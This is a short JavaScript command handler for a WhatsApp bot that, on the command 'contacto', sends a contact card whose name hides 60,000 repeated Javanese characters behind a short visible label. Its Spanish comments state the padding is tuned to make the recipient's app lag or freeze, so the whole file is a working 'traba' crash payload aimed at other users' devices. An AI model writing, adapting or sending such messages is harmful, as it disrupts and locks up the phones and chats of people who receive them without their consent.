let handler = async (m, { conn }) => {
  const number = '521234567890'; // Número real del contacto
  const basura = 'ꦾ'.repeat(60000); // Puedes ajustar esto según tu objetivo (lag, traba visual, etc.)
  const visible = '👀 CONTACTO 👀'; // Nombre corto visible
  const nombreFinal = visible + basura;

  const vcard = `
BEGIN:VCARD
VERSION:3.0
FN:${nombreFinal}
TEL;type=CELL;type=VOICE;waid=${number}:${number}
END:VCARD
  `.trim();

  await conn.sendMessage(m.chat, {
    contacts: {
      displayName: visible, // Mostrar algo legible
      contacts: [{ vcard }]
    }
  }, { quoted: m });
};

handler.command = /^contacto$/i;
export default handler;
